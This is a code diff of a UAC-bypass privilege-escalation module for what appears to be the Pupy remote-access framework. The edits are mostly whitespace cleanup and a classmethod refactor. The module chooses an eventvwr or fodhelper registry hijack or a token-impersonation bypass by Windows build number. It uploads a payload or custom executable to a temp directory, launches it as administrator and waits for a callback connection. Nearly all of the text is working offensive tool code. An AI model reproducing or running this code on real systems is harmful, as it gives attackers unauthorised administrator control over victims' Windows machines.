@@ -15,32 +15,33 @@ ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 
 @config(compat="windows", category="privesc")
 class BypassUAC(PupyModule):
-    
+
     """try to bypass UAC """
-    
+
     dependencies=['pupwinutils.bypassuac_token_imp','pupwinutils.bypassuac_registry', 'pupwinutils.security']
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
-        self.arg_parser.add_argument('-m', dest='method', choices=["eventvwr", "fodhelper", "tokenimp", ], default=None, help="By default, a method will be found for you depending on your build version")
-        self.arg_parser.add_argument('-e', dest='exe', default=None, help="Custom exe to execute as admin")
-        self.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help="Restart current executable as admin")
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog="bypassuac", description=cls.__doc__)
+        cls.arg_parser.add_argument('-m', dest='method', choices=["eventvwr", "fodhelper", "tokenimp", ], default=None, help="By default, a method will be found for you depending on your build version")
+        cls.arg_parser.add_argument('-e', dest='exe', default=None, help="Custom exe to execute as admin")
+        cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help="Restart current executable as admin")
 
     def run(self, args):
 
         method = args.method
-        if not method: 
+        if not method:
             windows_info = self.client.conn.modules["pupwinutils.security"].get_windows_version()
             if windows_info:
                 # check if your host is previous Vista
                 if float(str('%s.%s' % (windows_info['major_version'], windows_info['minor_version']))) < 6.0:
                     self.success('You are lucky, this Windows version does not implement UAC.')
                     return
-                
+
                 # Windows 10
                 if windows_info['build_number'] >= 10240:
                     method = 'fodhelper'
-                
+
                 # Windows 7, 8 and some Win10 build
                 elif windows_info['build_number'] >= 7600:
                     method = 'eventvwr'
@@ -49,7 +50,7 @@ class BypassUAC(PupyModule):
                     method = 'tokenimp'
             elif not windows_info:
                 self.error('No bypassuac method has been found automatically, you should do it manually using the "-m" option')
-                return 
+                return
 
         # check if a UAC bypass can be done
         if not self.client.conn.modules["pupwinutils.security"].can_get_admin_access():
@@ -88,9 +89,9 @@ class BypassUAC(PupyModule):
 
                 random_name += '.exe'
                 remotefile  = ros.path.join(tempdir, random_name)
-                
+
                 cmd     = remotefile
-                param   = u'' 
+                param   = u''
 
             else:
                 self.error('Executable file not found: %s' % args.exe)
@@ -106,7 +107,7 @@ class BypassUAC(PupyModule):
                 return
 
             cmd     = self.client.desc['exec_path']
-            param   = u'' 
+            param   = u''
 
         # upload payload (ps1 or custom exe)
         if not args.restart:
@@ -118,7 +119,7 @@ class BypassUAC(PupyModule):
         self.success("Trying to bypass UAC using the '%s' method" % method)
 
         # Works from: Windows 7 (7600)
-        # Fixed in: Windows 10 RS2 (15031) 
+        # Fixed in: Windows 10 RS2 (15031)
         if method == "eventvwr":
            self.client.conn.modules["pupwinutils.bypassuac_registry"].registry_hijacking_eventvwr(cmd, param)
 
@@ -132,7 +133,7 @@ class BypassUAC(PupyModule):
         elif method == "tokenimp":
             param = param.replace('-w hidden ', '')
             self.client.conn.modules["pupwinutils.bypassuac_token_imp"].run_bypass_uac_using_token_impersonation(cmd, param)
-        
+
         self.success("Waiting for a connection from the DLL (take few seconds, 1 min max)...")
 
         # TO DO (remove ps1 file)
